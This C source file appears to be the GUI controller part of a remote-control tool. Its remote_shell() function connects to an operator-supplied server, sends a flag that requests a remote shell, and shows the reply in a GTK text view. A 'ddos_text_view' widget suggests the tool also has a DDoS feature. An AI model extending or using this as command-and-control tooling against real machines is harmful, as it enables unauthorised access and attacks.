#include <arpa/inet.h>
#include <netdb.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>     /** EXIT_SUCCESS; **/
#include <errno.h>      /** perror **/
#include <unistd.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/remote_shell.h"
#include "../includes/constants.h"
#include "../includes/utils.h"


const gchar *server_ip;
const char *server_port;
int port;

SOCKET remote_shell_sock = 0;
GtkWidget *text_view;

GtkWidget *rs_text_view;
GtkWidget *ddos_text_view;

void remote_shell()
{
    //SOCKET remote_shell_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    int msg_len = 0;

    char buffer[MAXDATASIZE] = "";

    size_t flag_remote_shell = 8;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;


    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    remote_shell_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(remote_shell_sock == SOCKET_ERROR)
    {
        error("socket() remote_shell_sock", "remote_shell()");
        return;
    }

    err = connect(remote_shell_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "remote_shell()");
        return;
    }

    if(send(remote_shell_sock, (char*)&flag_remote_shell, sizeof(flag_remote_shell), 0) == SOCKET_ERROR)
    {
        error("send() flag_remote_shell", "remote_shell()");
        return;
    }

    /** Recieve the server connecting message **/
    if(recv(remote_shell_sock, (char*)&msg_len, sizeof(msg_len), 0) == SOCKET_ERROR)
    {
        error("recv() msg_len", "remote_shell()");
        return;
    }

    if(recv(remote_shell_sock, buffer, msg_len, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "remote_shell()");
        return;
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(rs_text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, buffer, -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    clean_buffer(buffer);

    return;
}
